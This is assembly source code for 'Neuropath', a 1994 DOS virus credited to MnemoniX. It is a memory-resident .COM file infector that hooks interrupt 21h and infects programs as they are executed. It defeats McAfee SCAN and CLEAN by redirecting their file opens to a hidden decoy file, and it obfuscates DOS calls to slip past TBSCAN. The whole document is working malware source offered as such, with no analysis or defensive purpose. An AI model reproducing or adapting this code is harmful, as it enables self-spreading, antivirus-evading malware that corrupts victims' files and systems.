; ========================================================================>
;  [Neuropath] by MnemoniX 1994
;
;  * Memory resident .COM infector
;  * Polymorphic (engine in neuroeng.asm - lame but effective)
;  * Anti-SCAN and CLEAN stealth technique - creates hidden file in
;    root directory; when SCAN or CLEAN is run all attempts to open .COM
;    files are redirected to hidden file, and they all come out clean.
; ========================================================================>

code            segment
                org     0
                assume  cs:code

start:
                db      0E9h,0,0

virus_begin:
                call    $ + 3
                pop     bp
                sub     bp,offset $ - 1

                mov     ah,3Ch
                mov     cx,2
                lea     dx,[bp + dummy_file]    ; create dummy file
                int     21h

                mov     ah,3Eh
                int     21h

install:
                mov     ax,5786h
                int     21h

                push    ds es

                mov     ax,ds
                dec     ax
                mov     ds,ax

                sub     word ptr ds:[3],((MEM_SIZE+1023) / 1024) * 64
                sub     word ptr ds:[12h],((MEM_SIZE+1023) / 1024) * 64
                mov     es,word ptr ds:[12h]

                push    cs                      ; copy virus into memory
                pop     ds
                xor     di,di
                mov     si,bp
                mov     cx,(virus_end - start) / 2 + 1
                rep     movsw

                xor     ax,ax                   ; capture interrupt 21
                mov     ds,ax

                mov     si,21h * 4
                mov     di,offset old_int_21
                movsw
                movsw

                mov     word ptr [si - 4],offset new_int_21
                mov     [si - 2],es

                pop     es ds
                jmp     install

int_21:
                pushf
                call    dword ptr cs:[old_int_21]
                ret

new_int_21:
                cmp     ax,5786h
                je      restore_host

                cmp     ah,4Ch
                je      terminate

                cmp     ah,3Dh
                je      file_open

                not     ax
                cmp     ax,0B4FFh
                je      execute
int_21_4B_exit:
                not     ax

int_21_exit:
                db      0EAh
old_int_21      dd      0

restore_host:
                pop     ax
                pop     ax

                push    ds
                mov     di,0FEFFh
                not     di

                lea     si,[bp + host]
                push    di
                movsw
                movsb

                iret

terminate:
                mov     cs:McAffee_alert,0
                jmp     int_21_exit

file_open:
                cmp     cs:McAffee_alert,1
                jne     int_21_exit

                push    ax si
                mov     si,dx

find_ext:
                lodsb
                cmp     al,'.'
                je      ext_found
                test    al,al
                je      not_com
                jmp     find_ext

ext_found:
                cmp     ds:[si],'OC'            ; .COM?
                jne     not_com
                cmp     byte ptr ds:[si + 2],'M'
                jne     not_com

                pop     si ax
                push    ds dx

                push    cs
                pop     ds
                mov     dx,offset dummy_file
                call    int_21

                pop     dx ds
                retf    2
not_com:
                pop     si ax
                jmp     int_21_exit

execute:
                push    ax si
                mov     si,dx

find_ext_2:
                lodsb
                cmp     al,'.'
                je      ext_found_2
                test    al,al
                je      no_scan
                jmp     find_ext_2
ext_found_2:
                cmp     ds:[si],'XE'            ; check for SCAN.EXE
                jne     no_scan
                cmp     ds:[si - 3],'NA'
                jne     no_scan
                cmp     ds:[si - 5],'CS'
                jne     perhaps_clean
mcaffee_on:
                pop     si ax
                mov     cs:McAffee_alert,1      ; McAffee alert!
                jmp     int_21_4B_exit

perhaps_clean:
                cmp     ds:[si - 5],'EL'        ; check for CLEAN.EXE
                jne     no_scan
                cmp     byte ptr ds:[si - 6],'C'
                je      mcaffee_on
no_scan:
                pop     si ax
                push    ax bx cx dx si di bp ds es

                mov     ax,3D00h
                call    int_21
                jnc     check_out
                jmp     cant_open
check_out:
                xchg    ax,bx

                push    cs                
                pop     ds

                push    bx
                mov     ax,ds:sft_1
                int     2Fh

                mov     ax,ds:sft_2
                mov     bl,es:[di]
                int     2Fh
                pop     bx

                mov     word ptr es:[di + 2],2

                mov     ax,es:[di + 0Dh]
                and     al,31
                cmp     al,24                   ; marker is 24
                je      dont_infect

                mov     ah,ds:file_read  ; anti-TBSCAN
                mov     dx,offset host
                mov     cx,3
                call    int_21

                mov     ax,word ptr ds:host
                sub     ax,'ZM'
                je      dont_infect

                mov     ax,es:[di + 11h]        ; file size
                cmp     ax,65278 - VIRUS_SIZE
                jae     dont_infect

                mov     es:[di + 15h],ax
                sub     ax,3
                mov     word ptr ds:new_jump + 1,ax

                push    es di bx
                add     ax,103h
                xchg    dx,ax
                mov     cx,VIRUS_SIZE
                mov     si,offset virus_begin
                mov     di,offset encrypt_buffer

                push    cs
                pop     es

                call    engine
                pop     bx di es

                mov     dx,offset encrypt_buffer
                call    write_it

                mov     word ptr es:[di + 15h],0
                mov     cx,3
                mov     dx,offset new_jump
                call    write_it

dont_infect:
                mov     ax,ds:set_date     ; anti-TBSCAN
                mov     cx,es:[di + 0Dh]
                mov     dx,es:[di + 0Fh]
                and     cl,-32
                or      cl,24
                call    int_21

                mov     ah,3Eh
                call    int_21
cant_open:
                pop     es ds bp di si dx cx bx ax
                jmp     int_21_4B_exit

write_it:
                mov     ah,ds:file_write   ; anti-TBSCAN
                call    int_21
                ret

                db      '[Neuropath] MnemoniX',0

dummy_file      db      '\',-1,-1,0                 ; 2 ASCII 255s

                include neuroeng.asm

McAffee_alert   db      0
host            db      0CDh,20h,0
new_jump        db      0E9h,0,0

set_date        dw      5701h
file_read       db      3Fh
file_write      db      40h
sft_1           dw      1220h
sft_2           dw      1216h

virus_end:
VIRUS_SIZE      equ     virus_end - virus_begin

encrypt_buffer  db      VIRUS_SIZE + 1000 dup (?)

heap_end:

MEM_SIZE        equ     heap_end - start

code            ends
                end     start
